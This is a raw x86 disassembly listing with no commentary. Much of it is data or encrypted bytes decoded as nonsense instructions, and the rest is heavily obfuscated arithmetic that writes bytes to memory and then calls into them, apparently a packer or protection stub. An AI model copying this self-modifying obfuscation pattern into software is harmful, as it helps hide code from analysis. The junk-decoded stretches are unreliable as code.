  40d48f:	lds    esp,FWORD PTR ds:0x30cb0ebe
  40d495:	and    DWORD PTR [ecx+esi*8],eax
  40d498:	aam    0x6c
  40d49a:	jnp    0x40d47d
  40d49c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d49d:	adc    BYTE PTR [edi-0x46],ah
  40d4a0:	and    eax,0xa55a58f9
  40d4a5:	and    DWORD PTR [esi+0x36],ebx
  40d4a8:	pop    esp
  40d4a9:	mov    cl,0x79
  40d4ab:	aad    0x80
  40d4ad:	repz cmc 
  40d4af:	hlt    
  40d4b0:	push   esp
  40d4b1:	imul   edx,DWORD PTR [ebx+0x513f4bd4],0x6e25febf
  40d4bb:	stos   BYTE PTR es:[edi],al
  40d4bc:	sahf   
  40d4bd:	push   0xefe37d19
  40d4c2:	(bad)  
  40d4c3:	iret   
  40d4c4:	xor    BYTE PTR [edx+0x35ecbde7],ch
  40d4ca:	js     0x40d483
  40d4cc:	in     eax,dx
  40d4cd:	and    BYTE PTR [edx-0x7a],0x51
  40d4d1:	pop    ebx
  40d4d2:	ins    BYTE PTR es:[edi],dx
  40d4d3:	sbb    al,0x61
  40d4d5:	jl     0x40d547
  40d4d7:	add    ch,dl
  40d4d9:	aas    
  40d4da:	aam    0xfd
  40d4dc:	mov    bh,0x29
  40d4de:	mov    ds:0x79949349,eax
  40d4e3:	shl    DWORD PTR [ebx+0x1221557c],cl
  40d4e9:	out    dx,eax
  40d4ea:	push   edi
  40d4eb:	fstp   TBYTE PTR [ebx]
  40d4ed:	inc    ebx
  40d4ee:	jl     0x40d515
  40d4f0:	jno    0x40d547
  40d4f2:	test   BYTE PTR [edi-0x36],ch
  40d4f5:	jo     0x40d526
  40d4f7:	out    0x12,eax
  40d4f9:	icebp  
  40d4fa:	cmp    DWORD PTR [edi+0x412c3182],ebx
  40d500:	mov    DWORD PTR [esi-0x611ed736],edx
  40d506:	ss call 0x4cae:0x83496079
  40d50e:	sbb    esi,DWORD PTR [edx-0x7bca6c38]
  40d514:	jle    0x40d57b
  40d516:	(bad)
  40d519:	in     al,dx
  40d51a:	shr    DWORD PTR [eax+0x14],1
  40d51d:	idiv   DWORD PTR [edx]
  40d51f:	sub    ch,BYTE PTR [edx-0x19]
  40d522:	xor    eax,0xdde5e199
  40d527:	push   ecx
  40d528:	push   ss
  40d529:	cdq    
  40d52a:	out    dx,eax
  40d52b:	data16 xor BYTE PTR gs:[ebx+0x13],bh
  40d530:	fmul   QWORD PTR [esp+ebp*4-0x79]
  40d534:	fnsave [edi+0x6e]
  40d537:	inc    esi
  40d538:	add    al,0x19
  40d53a:	out    0x9,eax
  40d53c:	inc    edx
  40d53d:	jnp    0x40d53a
  40d53f:	xor    dh,BYTE PTR [ebx+0x1c]
  40d542:	stos   DWORD PTR es:[edi],eax
  40d543:	sub    eax,0x341ac1eb
  40d548:	mov    esi,0xc09e0b05
  40d54d:	shl    BYTE PTR [esi-0xc],cl
  40d550:	or     eax,0xd625f832
  40d555:	je     0x40d523
  40d557:	pop    ss
  40d558:	sbb    eax,0xb300ecea
  40d55d:	daa    
  40d55e:	cs test eax,0x752a6673
  40d564:	in     al,dx
  40d565:	sbb    al,0x71
  40d567:	fwait
  40d568:	xchg   esi,eax
  40d569:	pop    esp
  40d56a:	jp     0x40d5aa
  40d56c:	sbb    cl,BYTE PTR [eax]
  40d56e:	jmp    0x18bc:0xa4cef6cd
  40d575:	lds    ebp,FWORD PTR [ebp-0x6d5c1601]
  40d57b:	mov    dh,0xa8
  40d57d:	mov    cl,BYTE PTR [edx-0x36]
  40d580:	sbb    eax,0xbf7b9a98
  40d585:	push   es
  40d586:	mov    ecx,0x43ea513e
  40d58b:	cmc    
  40d58c:	jne    0x40d559
  40d58e:	inc    edx
  40d58f:	shl    BYTE PTR [edi+0x74],1
  40d592:	fst    DWORD PTR [ecx]
  40d594:	xchg   ebp,eax
  40d595:	cmp    al,0xe0
  40d597:	jl     0x40d5bb
  40d599:	inc    esi
  40d59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d59b:	cwde   
  40d59c:	(bad)  
  40d59d:	jmp    0x40d55f
  40d59f:	and    al,0x70
  40d5a1:	es mov ch,0x16
  40d5a4:	mov    eax,DWORD PTR [ebp-0xc]
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x422281
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x422708
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x422708
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x422810
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x422808],eax
  40d707:	inc    DWORD PTR ds:0x422810
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422584
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x4227f8
  40d78f:	push   DWORD PTR ds:0x42258c
  40d795:	push   DWORD PTR ds:0x4227d8
  40d79b:	push   DWORD PTR ds:0x42284c
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x422708
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	js     0x40d7cf
  40d7f9:	xor    al,0xdd
  40d7fb:	gs lock mov esi,0xbec492be
  40d802:	mov    esi,0x8c92166e
  40d807:	not    DWORD PTR [eax*2-0x3753384f]
  40d80e:	or     eax,0xbc9fe8e1
  40d813:	cs sub bl,al
  40d816:	(bad)  
  40d817:	mov    ds:0x1fee427b,eax
  40d81c:	push   esi
  40d81d:	fisub  WORD PTR [esp+eax*4]
  40d820:	mov    dh,0xb
  40d822:	sbb    eax,0x7e8064aa
  40d827:	mov    ds:0x94aa767c,eax
  40d82c:	push   ds
  40d82d:	mov    ebp,0x88e6906c
  40d832:	and    DWORD PTR [edi-0x7c],edx
  40d835:	pop    esi
  40d836:	mov    ah,0x1c
  40d838:	loop   0x40d7e9
  40d83a:	mov    cs,WORD PTR [esi-0x928b60d]
  40d840:	inc    edi
  40d841:	xor    cx,si
  40d844:	jb     0x40d84d
  40d846:	fld    TBYTE PTR [edi-0x44d2c110]
  40d84c:	adc    BYTE PTR [eax],ah
  40d84e:	call   0xe391:0x4a2f191d
  40d855:	loopne 0x40d7fd
  40d857:	or     eax,0xc3d47426
  40d85c:	loope  0x40d8b4
  40d85e:	aad    0xc9
  40d860:	fadd   st,st(0)
  40d862:	jp     0x40d82b
  40d864:	or     BYTE PTR [ecx-0x7dc2b232],0x20
  40d86b:	cwde   
  40d86c:	cmc    
  40d86d:	pop    es
  40d86e:	and    eax,0x9ad379ee
  40d873:	in     al,dx
  40d874:	jbe    0x40d8bd
  40d876:	jmp    0x40d855
  40d878:	nop
  40d879:	sub    eax,0xadb2fb2f
  40d87e:	in     al,dx
  40d87f:	sbb    BYTE PTR [edi-0xd2aeb0],ch
  40d885:	sub    ah,BYTE PTR [esp+ecx*2]
  40d888:	add    ecx,edx
  40d88a:	ret    0x1f8c
  40d88d:	sub    eax,0x2b706a5c
  40d892:	jle    0x40d819
  40d894:	cdq    
  40d895:	lods   eax,DWORD PTR ds:[esi]
  40d896:	stos   DWORD PTR es:[edi],eax
  40d897:	dec    esi
  40d898:	loopne 0x40d878
  40d89a:	test   al,0xe9
  40d89c:	call   0x5c4e:0x219a467
  40d8a3:	dec    ebx
  40d8a4:	(bad)  
  40d8a5:	mul    DWORD PTR [ebx-0x8ee03e7]
  40d8ab:	jo     0x40d8d2
  40d8ad:	sub    ebx,edi
  40d8af:	or     BYTE PTR [ebx-0x4f],ch
  40d8b2:	addr16 adc al,0xf
  40d8b5:	jmp    0x14bd9c0b
  40d8ba:	add    edx,DWORD PTR [eax]
  40d8bc:	and    eax,0x58718cb1
  40d8c1:	call   0xbe9ad3e9
  40d8c6:	repz jmpw 0xd038
  40d8cb:	sbb    al,0x71
  40d8cd:	or     eax,0x69c25567
  40d8d2:	sbb    ch,ch
  40d8d4:	stos   DWORD PTR es:[edi],eax
  40d8d5:	rol    BYTE PTR [ecx+0x6b],0xb4
  40d8d9:	aam    0x46
  40d8db:	in     eax,dx
  40d8dc:	mov    al,0xe3
  40d8de:	mov    esp,0x901a857
  40d8e3:	add    DWORD PTR [ebx+0x74],0x283aaf70
  40d8ea:	mov    WORD PTR [ecx+edx*4-0x58],?
  40d8ee:	hlt    
  40d8ef:	push   cs
  40d8f0:	jb     0x40d89d
  40d8f2:	sub    al,0x83
  40d8f4:	jle    0x40d87c
  40d8f6:	jns    0x40d8a4
  40d8f8:	fmul   DWORD PTR [ecx+0x1d]
  40d8fb:	pop    es
  40d8fc:	adc    DWORD PTR [eax],ebx
  40d8fe:	sub    BYTE PTR [esi+0x79],cl
  40d901:	aas    
  40d902:	aaa    
  40d903:	leave  
  40d904:	and    BYTE PTR [esi],dl
  40d906:	iret   
  40d907:	jg     0x40d8e4
  40d909:	shr    DWORD PTR [ebp-0x4aaf9c6d],0x2a
  40d910:	add    al,0x15
  40d912:	mov    ebp,0xa29db7fe
  40d917:	leave  
  40d918:	ffreep st(2)
  40d91a:	imul   edx,DWORD PTR [edx+0x4c],0xffffff95
  40d91e:	pop    es
  40d91f:	xor    esp,DWORD PTR [edx]
  40d921:	retf   
  40d922:	idiv   DWORD PTR [edi]
  40d924:	imul   edi,DWORD PTR [eax+0x4fdac41e],0xdc2616e6
  40d92e:	bound  ecx,QWORD PTR [ebx]
  40d930:	inc    esp
  40d931:	jnp    0x40d938
  40d933:	and    edi,DWORD PTR [ecx]
  40d935:	cmp    BYTE PTR [ebx-0x3d],cl
  40d938:	aad    0xb6
  40d93a:	mov    ecx,0x2d56f903
  40d93f:	adc    cl,BYTE PTR [esi+0x7301df76]
  40d945:	push   ebx
  40d946:	sub    esp,edi
  40d948:	fist   WORD PTR [esi]
  40d94a:	rol    DWORD PTR [ebp-0x270f7195],cl
  40d950:	dec    esi
  40d951:	jmp    0x65a6935d
  40d956:	scas   eax,DWORD PTR es:[edi]
  40d957:	mov    ebx,DWORD PTR [edi-0x2daf2371]
  40d95d:	int    0x46
  40d95f:	in     al,0x80
  40d961:	jno    0x40d954
  40d963:	out    0xe4,eax
  40d965:	in     eax,0x32
  40d967:	fmul   st,st(2)
  40d969:	loop   0x40d93b
  40d96b:	and    DWORD PTR ds:0x289ee86b,edi
  40d971:	or     dh,ch
  40d973:	stos   BYTE PTR es:[edi],al
  40d974:	mov    al,0xd5
  40d976:	fcom   st(1)
  40d978:	pop    ecx
  40d979:	cmp    BYTE PTR [ebp-0x30],dl
  40d97c:	xchg   edx,eax
  40d97d:	jb     0x40d9ce
  40d97f:	dec    esi
  40d980:	xchg   BYTE PTR [esi],cl
  40d982:	imul   edx,ecx,0x5c1ed1e9
  40d988:	jne    0x40d9f3
  40d98a:	mov    ebx,0x72652ff0
  40d98f:	ja     0x40d9a8
  40d991:	or     BYTE PTR [edx+ebp*1],cl
  40d994:	pop    edi
  40d995:	mov    ds:0x28843739,al
  40d99a:	rcl    DWORD PTR [esi-0x6345d4f7],cl
  40d9a0:	aas    
  40d9a1:	sar    dh,cl
  40d9a3:	fwait
  40d9a4:	pop    ebp
  40d9a5:	cmp    al,0x8b
  40d9a7:	mov    BYTE PTR [ecx],bh
  40d9a9:	js     0x40d98c
  40d9ab:	sub    cl,BYTE PTR [ebp-0x4292d2bd]
  40d9b1:	and    eax,0x5426cf7
  40d9b6:	and    DWORD PTR [ebp-0x11],edi
  40d9b9:	test   BYTE PTR [eax],ch
  40d9bb:	cmp    BYTE PTR gs:[ecx],cl
  40d9be:	xchg   BYTE PTR [eax],ch
  40d9c0:	rcr    BYTE PTR [ebx],cl
  40d9c2:	mov    esi,?
  40d9c4:	ins    DWORD PTR es:[edi],dx
  40d9c5:	inc    edi
  40d9c6:	imul   edi,DWORD PTR [edx+0x1f10dad2],0xf4ecc177
  40d9d0:	cs sbb edi,0x5db54be3
  40d9d7:	fadd   QWORD PTR [edx]
  40d9d9:	jecxz  0x40d9b6
  40d9db:	xchg   esi,eax
  40d9dc:	or     BYTE PTR [ebx+0x3f],dh
  40d9df:	sub    al,0x7d
  40d9e1:	rcr    esi,1
  40d9e3:	(bad)  
  40d9e4:	adc    al,0x2f
  40d9e6:	jecxz  0x40da42
  40d9e8:	loope  0x40da37
  40d9ea:	xor    edi,0x7ef88a31
  40d9f0:	mov    bl,0xa9
  40d9f2:	mov    esp,0x1531d284
  40d9f7:	cmp    eax,0x380a050f
  40d9fc:	cmp    al,0x7d
  40d9fe:	push   ecx
  40d9ff:	inc    ebx
  40da00:	mov    BYTE PTR [ecx-0x659ba1c2],ah
  40da06:	(bad)  
  40da07:	xor    eax,0x3c4658ea
  40da0c:	xor    esp,DWORD PTR es:[esi-0x58b5f141]
  40da13:	int3   
  40da14:	call   FWORD PTR [esp+edx*2]
  40da17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da18:	ja     0x40d9dc
  40da1a:	adc    esi,DWORD PTR [ebp+0x1a]
  40da1d:	aas    
  40da1e:	addr16 je 0x40d9a3
  40da21:	std    
  40da22:	je     0x40d9e7
  40da24:	shl    edi,cl
  40da26:	sbb    bh,BYTE PTR [ebp-0x46]
  40da29:	sbb    ah,ah
  40da2b:	mov    edx,0xe9440377
  40da30:	ds in  eax,0xa7
  40da33:	adc    BYTE PTR [eax+0x222efa25],bh
  40da39:	stos   DWORD PTR es:[edi],eax
  40da3a:	push   eax
  40da3b:	aas    
  40da3c:	mov    ds:0x9450f643,al
  40da41:	popa   
  40da42:	sti    
  40da43:	jmp    0x40da62
  40da45:	mov    edx,0x8bf4ff11
  40da4a:	fmul   DWORD PTR [esi]
  40da4c:	mov    ch,0x1c
  40da4e:	jns    0x40d9f9
  40da50:	pop    edi
  40da51:	sbb    DWORD PTR [esp+edi*8],esi
  40da54:	mov    bh,0x97
  40da56:	inc    edi
  40da57:	cmp    DWORD PTR [edx-0x50d31adb],edx
  40da5d:	push   0xffffffbe
  40da5f:	pop    ecx
  40da60:	xchg   ecx,eax
  40da61:	jl     0x40da04
  40da63:	iret   
  40da64:	rol    ebp,cl
  40da66:	lds    ecx,FWORD PTR [ebp-0x33]
  40da69:	xor    eax,0x9ddd3bb6
  40da6e:	dec    eax
  40da6f:	js     0x40da9a
  40da71:	mov    bl,0x70
  40da73:	sub    dh,ah
  40da75:	mov    ebx,0xe8e3bb16
  40da7a:	xlat   BYTE PTR ds:[ebx]
  40da7b:	inc    edi
  40da7c:	dec    edx
  40da7d:	aad    0x86
  40da7f:	fldpi  
  40da81:	cld    
  40da82:	mov    dh,0x99
  40da84:	cdq    
  40da85:	out    dx,eax
  40da86:	call   0x31015751
  40da8b:	cmp    ebp,DWORD PTR [edx+0x3c3a0126]
  40da91:	push   ebx
  40da92:	dec    eax
  40da93:	cmp    al,0x30
  40da95:	push   0xffffffdd
  40da97:	dec    edx
  40da98:	mov    ebp,0x33d22f05
  40da9d:	xchg   esi,eax
  40da9e:	xor    al,0xd3
  40daa0:	dec    eax
  40daa1:	fcmovu st,st(4)
  40daa3:	je     0x40db0b
  40daa5:	stc    
  40daa6:	push   0xffffffb9
  40daa8:	js     0x40da6f
  40daaa:	mov    esi,0x3dc40a38
  40daaf:	mov    bl,0x96
  40dab1:	ss pop ss
  40dab3:	ja     0x40db0c
  40dab5:	sub    bl,BYTE PTR [esi+0x27ec8504]
  40dabb:	popa   
  40dabc:	iret   
  40dabd:	adc    ah,BYTE PTR ds:0xb40cad33
  40dac3:	pop    esi
  40dac4:	in     al,0x4b
  40dac6:	sti    
  40dac7:	mov    ch,0xe5
  40dac9:	dec    ecx
  40daca:	push   ds
  40dacb:	add    BYTE PTR [ebx-0x49747ca9],dl
  40dad1:	sub    eax,0x996ea470
  40dad6:	add    dl,BYTE PTR [ecx]
  40dad8:	mov    ecx,0x8f9e6e67
  40dadd:	test   al,0x4e
  40dadf:	mov    ecx,0xad888e4f
  40dae4:	ins    DWORD PTR es:[edi],dx
  40dae5:	jge    0x40daff
  40dae7:	repnz fmul DWORD PTR [eax+edi*1]
  40daeb:	push   ecx
  40daec:	sbb    DWORD PTR [edx],eax
  40daee:	sbb    DWORD PTR [edi-0x71],ebp
  40daf1:	sbb    bh,ch
  40daf3:	retf   0xf823
  40daf6:	in     al,dx
  40daf7:	ret    0xad
  40dafa:	mov    eax,ds:0xd470a6ef
  40daff:	stc    
  40db00:	in     al,dx
  40db01:	inc    eax
  40db02:	in     eax,0x49
  40db04:	jmp    0x67e9:0xe880b4c0
  40db0b:	push   edi
  40db0c:	or     ch,bh
  40db0e:	fcomi  st,st(2)
  40db10:	test   eax,0xd5c8cb1c
  40db15:	sahf   
  40db16:	(bad)  
  40db17:	call   0x107e:0xcfe42e29
  40db1e:	mul    DWORD PTR [eax-0x3ff7ac34]
  40db24:	mov    ds:0xed6bddc7,eax
  40db29:	push   0x4a40e4b7
  40db2e:	push   esp
  40db2f:	mov    ebp,0xa1fa6910
  40db34:	and    DWORD PTR [ebp+0x4929189d],0x3e
  40db3b:	xor    eax,0xbad313d7
  40db40:	sub    eax,DWORD PTR [esi]
  40db42:	pop    ebp
  40db43:	sti    
  40db44:	call   0xa1af00be
  40db49:	or     BYTE PTR [ebx-0x76],0x66
  40db4d:	pop    ecx
  40db4e:	es mov ecx,0x4e745ccf
  40db54:	inc    esp
  40db55:	jmp    esi
  40db57:	sbb    bh,BYTE PTR [edx]
  40db59:	push   ds
  40db5a:	out    dx,al
  40db5b:	fcom   DWORD PTR [edx-0x46]
  40db5e:	mov    ebx,ss
  40db60:	cmp    BYTE PTR [esi-0x2b],0x28
  40db64:	adc    bh,dl
  40db66:	int3   
  40db67:	mov    WORD PTR [edi-0x7e],cs
  40db6a:	sub    ecx,ecx
  40db6c:	mov    ah,0x49
  40db6e:	cmp    bl,BYTE PTR [edi-0x48]
  40db71:	scas   al,BYTE PTR es:[edi]
  40db72:	std    
  40db73:	mov    ecx,DWORD PTR [ecx+0x45a91cd8]
  40db79:	xor    al,0xa4
  40db7b:	dec    eax
  40db7c:	mov    eax,0xf85e1faf
  40db81:	jg     0x40db56
  40db83:	dec    edi
  40db84:	fs pop edx
  40db86:	int3   
  40db87:	ret    
  40db88:	fst    QWORD PTR [edi]
  40db8a:	xor    dl,cl
  40db8c:	lods   eax,DWORD PTR ds:[esi]
  40db8d:	pop    ebx
  40db8e:	sub    BYTE PTR [ecx],ch
  40db90:	sub    ebx,DWORD PTR [eax+0x790fb0ac]
  40db96:	mov    dl,0x62
  40db98:	xchg   edi,eax
  40db99:	(bad)  
  40db9a:	daa    
  40db9b:	retf   
  40db9c:	inc    ebx
  40db9d:	xchg   edx,eax
  40db9e:	sahf   
  40db9f:	add    DWORD PTR [ebx+ecx*8+0x53b567c9],edx
  40dba6:	sub    esi,DWORD PTR [ebp-0x35a52e3f]
  40dbac:	das    
  40dbad:	js     0x40dbc1
  40dbaf:	rcr    DWORD PTR [ecx-0x3731b005],cl
  40dbb5:	das    
  40dbb6:	cli    
  40dbb7:	jmp    0xbba31f7f
  40dbbc:	inc    esp
  40dbbd:	jnp    0x40db78
  40dbbf:	and    edx,edi
  40dbc1:	dec    esi
  40dbc2:	jp     0x40db48
  40dbc4:	cmp    edi,esi
  40dbc6:	push   ss
  40dbc7:	xchg   edi,eax
  40dbc8:	pop    ss
  40dbc9:	fdiv   DWORD PTR [esi-0x40]
  40dbcc:	pop    ss
  40dbcd:	adc    al,0xdc
  40dbcf:	in     eax,0x0
  40dbd1:	or     al,0x51
  40dbd3:	loopne 0x40db70
  40dbd5:	push   ds
  40dbd6:	jmp    0x40dc2e
  40dbd8:	inc    ebp
  40dbd9:	or     ch,al
  40dbdb:	jmp    0xf01f:0xd61d239e
  40dbe2:	out    0x2,eax
  40dbe4:	add    eax,0x1fede6c7
  40dbe9:	cmp    eax,0x21673b9c
  40dbee:	push   ss
  40dbef:	repnz in al,dx
  40dbf1:	pop    esi
  40dbf2:	pop    ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	ror    DWORD PTR [ebx],1
  40dc2d:	int3   
  40dc2e:	dec    eax
  40dc2f:	xchg   edx,eax
  40dc30:	cmp    eax,edi
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0xdae2c31f
  40dc3c:	out    dx,al
  40dc3d:	xchg   edx,eax
  40dc3e:	(bad)  
  40dc3f:	mov    al,0xe3
  40dc41:	inc    ebp
  40dc42:	iret   
  40dc43:	(bad)  
  40dc44:	cmc    
  40dc45:	lock sub BYTE PTR [ebp+0x60],bl
  40dc49:	imul   eax,DWORD PTR [ecx],0xffffff91
  40dc4c:	test   DWORD PTR [edx],ecx
  40dc4e:	mov    es,WORD PTR [edx-0xbfa7f90]
  40dc54:	aam    0xf6
  40dc56:	jns    0x40dbdc
  40dc58:	xor    BYTE PTR [ebp-0xc4a256c],bh
  40dc5e:	mov    edx,0x438f9fce
  40dc63:	pop    ebp
  40dc64:	je     0x40dcc6
  40dc66:	xor    bl,BYTE PTR [eax]
  40dc68:	in     al,dx
  40dc69:	inc    ecx
  40dc6a:	inc    DWORD PTR ds:0xdaf87d4b
  40dc70:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc72:	pop    edi
  40dc73:	xchg   ebp,eax
  40dc74:	pop    edi
  40dc75:	sub    ah,ah
  40dc77:	(bad)
  40dc7a:	sbb    dl,cl
  40dc7c:	adc    BYTE PTR [edx+edi*2],cl
  40dc7f:	jecxz  0x40dccd
  40dc81:	pushf  
  40dc82:	sbb    dl,dh
  40dc84:	adc    BYTE PTR [ecx+0x195036b0],bh
  40dc8a:	stos   BYTE PTR es:[edi],al
  40dc8b:	add    eax,0x7877979f
  40dc90:	inc    ebx
  40dc91:	call   0xf70ff7e2
  40dc96:	jbe    0x40dd0d
  40dc98:	shr    DWORD PTR [eax+0x6c6c6f21],0x5
  40dc9f:	mov    eax,ds:0x239fef9
  40dca4:	aaa    
  40dca5:	push   edi
  40dca6:	sti    
  40dca7:	sbb    al,0xd6
  40dca9:	and    DWORD PTR [ebp+edx*2-0x7329e1ed],edi
  40dcb0:	pusha  
  40dcb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb2:	inc    eax
  40dcb3:	popa   
  40dcb4:	(bad)  
  40dcb6:	aas    
  40dcb7:	mov    esp,0xffe06356
  40dcbc:	push   ss
  40dcbd:	aas    
  40dcbe:	test   BYTE PTR ds:0xc04c7f18,0xcf
  40dcc5:	call   0xf50280c3
  40dcca:	mov    eax,0x26b5f4f3
  40dccf:	cmp    eax,0xd29956d8
  40dcd4:	stos   BYTE PTR es:[edi],al
  40dcd5:	mov    BYTE PTR [esi],ch
  40dcd7:	pop    ebp
  40dcd8:	aaa    
  40dcd9:	sub    ah,BYTE PTR [eax+0x45dddd87]
  40dcdf:	leave  
  40dce0:	inc    edx
  40dce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce2:	cmp    DWORD PTR [edx-0x16f302a6],ebp
